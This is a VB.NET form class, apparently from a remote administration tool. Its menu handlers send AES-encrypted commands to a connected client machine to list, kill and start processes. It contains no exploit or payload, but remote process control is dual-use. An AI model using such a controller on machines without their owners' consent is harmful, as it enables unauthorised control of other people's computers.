Public Class FormProcess
    Public connected As Connection
    Private Sub ChangeFont(ByVal container As Control)
        For Each ctrl As Control In container.Controls
            ' Change font for the control
            ctrl.Font = New Font("Comic Sans MS", 9, FontStyle.Regular)

            ' If the control has children, recursively change their fonts
            If ctrl.HasChildren Then
                ChangeFont(ctrl)
            End If
        Next
    End Sub
#Region "Process"
    Private Sub ToolStripMenuItem1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ToolStripMenuItem1.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("GetProcess", Form1.enckey))
        Catch
        End Try
    End Sub
    Private Sub KillProcessToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles KillProcessToolStripMenuItem.Click
        Try
            Dim items As String = Nothing
            For Each item As ListViewItem In listprocess.SelectedItems
                items += item.Text & "|"
                listprocess.Items.RemoveAt(item.Index)
            Next
            connected.Send(New Encryption().AES_Encrypt("Kill|" & items, Form1.enckey))
            Label1.Text = "Total Processes: " & listprocess.Items.Count
        Catch
        End Try
    End Sub
    Private Sub NewProcessToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles NewProcessToolStripMenuItem.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("New|" & InputBox("Process-name to start", "New Process"), Form1.enckey))
        Catch
        End Try
    End Sub
#End Region

    Private Sub FormProcess_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
        ChangeFont(Me)

    End Sub

    Private Sub FormProcess_Resize(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Resize
        On Error Resume Next

        listprocess.Height = Me.Height - PictureBox1.Height - 10
        listprocess.Width = Me.Width
    End Sub
End Class